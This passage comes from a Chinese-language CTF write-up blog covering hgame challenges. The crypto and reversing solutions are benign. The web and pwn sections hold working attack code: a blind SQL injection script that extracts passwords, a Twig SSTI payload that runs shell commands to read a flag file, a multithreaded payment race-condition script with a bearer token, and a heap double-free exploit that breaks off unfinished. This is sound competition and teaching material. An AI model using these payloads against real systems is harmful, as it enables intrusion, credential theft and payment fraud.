    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>)
    {
        <span style="color:#66d9ef">for</span> (flag[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>; flag[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>; flag[i]<span style="color:#f92672">++</span>)
        {
            c <span style="color:#f92672">=</span> flag[i];
            rot <span style="color:#f92672">=</span> flag[i] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>;
            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; j<span style="color:#f92672">++</span>)
            {
                <span style="color:#66d9ef">if</span> ((rot <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
                    rot <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
                <span style="color:#66d9ef">else</span>
                    rot <span style="color:#f92672">=</span> (rot <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x1021</span>;
            }
            rot1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)rot;
            <span style="color:#66d9ef">if</span> (rot1 <span style="color:#f92672">==</span> ans[i])
            {
                printf(<span style="color:#e6db74">&#34;%c&#34;</span>, c);
            }
        }
    }
}
</code></pre></div><p>直接运行就可以出 flag 啦。</p>
<p>后来才发现这个根本不是什么加密算法，就是上学期我刚学过的 CRC-16 校验码，这种都是直接爆破就行了。</p>
<blockquote>
<p>CRC16的算法原理：</p>
<ol>
<li>根据CRC16的标准选择初值 CRCIn 的值；</li>
<li>将数据的第一个字节与 CRCIn 高 8 位异或；</li>
<li>判断最高位，若该位为 0 左移一位，若为 1 左移一位再与多项式 Hex 码异或；</li>
<li>重复 3 直至 8 位全部移位计算结束；</li>
<li>重复将所有输入数据操作完成以上步骤，所得 16 位数即 16 位 CRC 校验码。</li>
</ol>
<p>CRC16_CCITT：</p>
<p>多项式 $x^{16} + x^{12}+ x^5+1（0x1021）$，初始值 $0x0000$，低位在前，高位在后，结果与 $0x0000$ 异或；</p>
</blockquote>
<h3 id="reupx-magic-1">[RE]upx magic 1</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>发现没法自动脱壳，010 打开之后，手动把三个 <code>UPX?</code> 改成 <code>UPX!</code>，之后就能自动脱壳了</p>
<h3 id="cryptochinese-character-encryption">[Crypto]Chinese Character Encryption</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>脑洞题。</p>
<p>解压后得到 flag.enc，用记事本打开发现是许多汉字字符串，因此猜想是否与汉字在 Unicode 中的编码有关，尝试破解失败。题目中提示 flag.enc 中每一行均是 flag 的加密，说明每一行汉字都是 flag。发现相同的字母在加密后得到了不同的汉字，这说明每一行相同位置出现的不同的汉字在某些方面具有共同点。</p>
<p>题目提示该题的加密方式只与汉字的拼音有关，因此使用 pypinyin 包解出拼音，发现每一行相同位置的汉字的拼音高度重合。联想到拼音的数字表达形式（按照声调一二三四标在拼音后加上 1234，轻声按 0 处理），猜想将拼音字母的 ASCII 码加和再加上声调代表的数字的 ASCII 码（轻声加 48，一声加 49，二声加 50，以此类推）作为汉字的编码，即 pypinyin 包中的 Style.TONE3 风格解出的字符串 ASCII 之和。操作发现部分汉字编码相同，说明猜想合理。</p>
<p>尝试对编码进行操作，发现对 128 取模后开始几个汉字的 ASCII 码对应 hgame，解密即可：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pypinyin

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(s):
    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> s:
        ASCII_sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        k <span style="color:#f92672">=</span> pypinyin<span style="color:#f92672">.</span>pinyin(c,style <span style="color:#f92672">=</span> pypinyin<span style="color:#f92672">.</span>Style<span style="color:#f92672">.</span>TONE3)[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> k:
            ASCII_sum <span style="color:#f92672">+=</span> ord(i)
        flag <span style="color:#f92672">+=</span> chr(ASCII_sum <span style="color:#f92672">%</span> <span style="color:#ae81ff">128</span>)
    <span style="color:#66d9ef">return</span> flag

message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;陉萏俦蘭貑謠祥冄剏髯簧凰蕆秉僦笆鼣雔耿睺渺仦殣櫤鄽偟壮褃劳充迧蝔镁樷萾懴雈踺猳钔緲螩蝒醢徣纒漐&#34;</span>
print(decrypt(message))
<span style="color:#75715e"># &#34;hgame{It*sEEMS|thaT~YOu=LEArn@PinYiN^VerY-WelL}&#34;</span>
</code></pre></div><h3 id="cryptorsa-attack">[Crypto]RSA Attack</h3>
<h3 id="cryptorsa-attack-2">[Crypto]RSA Attack 2</h3>
<h3 id="cryptothe-password-plus-pro-max-ultra">[Crypto]The Password Plus Pro Max Ultra</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>解压得到output.txt和task.py，先分析加密代码如下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">move</span>(n, k):
    s <span style="color:#f92672">=</span> bin(n)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">64</span>) <span style="color:#75715e"># 将n转为64位二进制的形式</span>
    k <span style="color:#f92672">=</span> k <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">63</span>
    <span style="color:#66d9ef">return</span> int(s[k:] <span style="color:#f92672">+</span> s[:k], <span style="color:#ae81ff">2</span>) <span style="color:#75715e"># 循环左移k位</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(x, ks):
    <span style="color:#66d9ef">return</span> xor(x, reduce(xor, map(<span style="color:#66d9ef">lambda</span> k: move(x, k), ks))) <span style="color:#75715e"># 设ks中的数为a1,a2,..,an,返回x^(x&lt;&lt;&lt;a1)^(x&lt;&lt;&lt;a2)^...^(x&lt;&lt;&lt;an)</span>


xs <span style="color:#f92672">=</span> list(map(s2n, findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;.{1,8}&#34;</span>, flag))) <span style="color:#75715e"># 将flag每八个字符分成一组得到多组字符串，转成整数放入xs</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(xs)):
    ks <span style="color:#f92672">=</span> sample(range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">64</span>), (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) <span style="color:#75715e"># 对于xs中第i个数，在1到64的范围内随机选取(i + 1) * 2个数，放入ks</span>
    y <span style="color:#f92672">=</span> encrypt(xs[i], ks) <span style="color:#75715e"># 利用ks加密xs中的每个数字</span>
    <span style="color:#66d9ef">assert</span> xs[i] <span style="color:#f92672">==</span> decrypt(y, ks)
    print(y, sorted(ks)) <span style="color:#75715e"># 输出y和ks</span>
</code></pre></div><p>发现本题实际上使用的是循环移位-异或加密。output.txt 中每一行前面的数字是加密得到的结果，后面的列表是加密过程中异或式每一项循环左移的位数。</p>
<p>对于固定位数 m 的二进制串，循环移位-异或加密算法相当于在系数取自 GF(2) 的条件下对二进制多项式做左乘及加和处理，只不过在每次处理之后均要对 m 次多项式求模。因此，对于一个 m 位的二进制串，执行 m 次循环移位-异或算法后将回到其本身。这个性质说明只需将本题中给出的一次加密结果利用移位数列表再加密 63 次即可还原出明文。解密代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">move</span>(n, k):
    s <span style="color:#f92672">=</span> bin(n)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">64</span>)
    k <span style="color:#f92672">=</span> k <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">63</span>
    <span style="color:#66d9ef">return</span> int(s[k:] <span style="color:#f92672">+</span> s[:k], <span style="color:#ae81ff">2</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(x, ks):
    <span style="color:#66d9ef">return</span> xor(x, reduce(xor, map(<span style="color:#66d9ef">lambda</span> k: move(x, k), ks)))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(m,l):
    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(m)):
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">63</span>):
            m[i] <span style="color:#f92672">=</span> encrypt(m[i],l[i])
        flag <span style="color:#f92672">+=</span> str(n2s(m[i]))
        flag <span style="color:#f92672">=</span> flag<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;b&#39;&#34;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
    <span style="color:#66d9ef">return</span> flag

m <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2656224875120172108</span>,<span style="color:#ae81ff">1261711348908201279</span>,<span style="color:#ae81ff">18219282869614004824</span>,<span style="color:#ae81ff">15279054981769814589</span>,<span style="color:#ae81ff">7966355346882200701</span>,<span style="color:#ae81ff">5641592208539483808</span>,<span style="color:#ae81ff">1502927090219059154</span> ,<span style="color:#ae81ff">3996223120734273799</span>,<span style="color:#ae81ff">18295033054788808618</span>,<span style="color:#ae81ff">18126228466291248047</span>,<span style="color:#ae81ff">9413762634844369954</span> ,<span style="color:#ae81ff">8964324149921197550</span>,<span style="color:#ae81ff">6962485320551449848</span>]
l <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">35</span>],[<span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>],[<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">55</span>],[<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">63</span>],[<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>],[<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">62</span>],[<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">58</span>],[<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">61</span>],[<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">62</span>],[<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">62</span>],[<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">60</span>],[<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">53</span>],[<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">62</span>]]

print(decrypt(m,l))
<span style="color:#75715e">#&#34;hgame{XOr|RoR&amp;rOl|Is+vERY#coMmon*BiTwisE$OPeraTiOn*IT@is%oFten,ENCOUntErED*in.syMMeTRic?encryPtION}&#34;</span>
</code></pre></div><h2 id="week3">week3</h2>
<h3 id="webloginme">[Web]LoginMe</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>hint 里给了部分查询语句，通过 <code>') or ('</code> 左右闭合后中间能进行布尔盲注，尝试用 left, ascii 等函数均未返回预期结果，故不是 mysql 数据库，经验证为 sqlite 注入。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> json

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://f4440d8510.login.summ3r.top:60067/login&#39;</span>
ans <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
header <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>
}
<span style="color:#75715e"># sql = &#39;select group_concat(sql) from sqlite_master&#39;</span>
sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;select group_concat(password) from uuussseeerrrsss limit 0, 1&#39;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000</span>):
    L <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
    R <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span>
    <span style="color:#66d9ef">while</span> R <span style="color:#f92672">-</span> L <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
        mid <span style="color:#f92672">=</span> (L <span style="color:#f92672">+</span> R) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>
        payload <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;ass&#39;) or substr((</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">), </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">, 1) &lt; &#39;</span><span style="color:#e6db74">%c</span><span style="color:#e6db74">&#39; or (username=&#39;test1&#34;</span> <span style="color:#f92672">%</span> (sql, i, chr(mid)),
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;114514&#34;</span>
        }
        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>header, data<span style="color:#f92672">=</span>json<span style="color:#f92672">.</span>dumps(payload))
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;success&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            R <span style="color:#f92672">=</span> mid
        <span style="color:#66d9ef">else</span>:
            L <span style="color:#f92672">=</span> mid
    ans <span style="color:#f92672">+=</span> chr(L)
    print(ans)

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">CREATE TABLE `uuussseeerrrsss` (
</span><span style="color:#e6db74">    `id` integer,
</span><span style="color:#e6db74">    `created_at` datetime,
</span><span style="color:#e6db74">    `updated_at` datetime,
</span><span style="color:#e6db74">    `deleted_at` datetime,
</span><span style="color:#e6db74">    `username` text UNIQUE,
</span><span style="color:#e6db74">    `password` text,
</span><span style="color:#e6db74">    PRIMARY KEY (`id`)
</span><span style="color:#e6db74">),CREATE INDEX `idx_uuussseeerrrsss_deleted_at` ON `uuussseeerrrsss`(`deleted_at`)         
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</code></pre></div><h3 id="websecuritycenter">[Web]SecurityCenter</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>查看 hint，该项目装了如下三个包：</p>
<pre tabindex="0"><code>symfony/polyfill-ctype v1.24.0
symfony/polyfill-mbstring v1.24.0
twig/twig v3.3.7
</code></pre><p>依次搜索，twig 在 18 年爆出了一个 SSTI 的洞，于是在 url 处找到注入点：<code>[146.56.223.34:60036/redirect.php?url={{1*7}}](http://146.56.223.34:60036/redirect.php?url={{1*7}})</code></p>
<p>随手找了个 TWIG3.X 的 payload，<code>{{[&quot;id&quot;, 0\]|sort(&quot;system&quot;)|join(&quot;,&quot;)}}</code></p>
<p>成功 rce，但是读 flag 的时候 cat 被 waf，用 head 去绕，正则匹配了 hgame 内容，base64 一下即可。</p>
<p>最终payload：</p>
<p><code>http://146.56.223.34:60036/redirect.php?url={{[&quot;head /flag|base64&quot;, 0]|sort(&quot;system&quot;)|join(&quot;,&quot;)}})</code></p>
<h3 id="webvidar-shop-demo">[Web]Vidar shop demo</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>条件竞争，抢占的资源是钱，可以先狂发 300 个 40 块的订单的包，然后开多线程分别去支付这些包，如果条件竞争顺利的话应该来不及太扣钱，然后我们就分别对这些订单退款钱就够了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> threading

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://559e013ac8.vidar-shop.mjclouds.com/api/pay/create&#39;</span>
payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;uid&#34;</span>: <span style="color:#ae81ff">315</span>,  <span style="color:#e6db74">&#34;amount&#34;</span>: <span style="color:#ae81ff">20</span>}
header <span style="color:#f92672">=</span> {
    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
    <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQxMzgxNjUsImlhdCI6MTY0NDA1MTc2NSwidWlkIjozMTV9.QyUNGJRUDQ4qp13utRgTWV8jDs4UhQYWOX8BP6wWcng&#39;</span>
}
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy</span>(id):
    payload[<span style="color:#e6db74">&#34;oid&#34;</span>] <span style="color:#f92672">=</span> id
    requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>header, data<span style="color:#f92672">=</span>json<span style="color:#f92672">.</span>dumps(payload))

ts <span style="color:#f92672">=</span> []

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5603</span>, <span style="color:#ae81ff">5855</span>):
    exec(<span style="color:#e6db74">&#39;t</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74"> = threading.Thread(target=buy,args=(i,))&#39;</span><span style="color:#f92672">.</span>format(i))
    exec(<span style="color:#e6db74">&#39;ts.append(t</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">)&#39;</span><span style="color:#f92672">.</span>format(i))
<span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> ts:
    s<span style="color:#f92672">.</span>start()
print(<span style="color:#e6db74">&#34;DONE&#34;</span>)
</code></pre></div><h3 id="pwnelder_note">[Pwn]elder_note</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p><code>double free</code> 写 <code>malloc_hook</code>, <code>double_free</code> 报错拿 shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./note&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">52620</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4. farewell&#34;</span>, str(i))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, content):
    menu(<span style="color:#ae81ff">1</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size?&#34;</span>, str(size))
    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;content?&#34;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    menu(<span style="color:#ae81ff">2</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
    menu(<span style="color:#ae81ff">3</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
free(<span style="color:#ae81ff">0</span>)
show(<span style="color:#ae81ff">0</span>)
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">88</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>]


add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
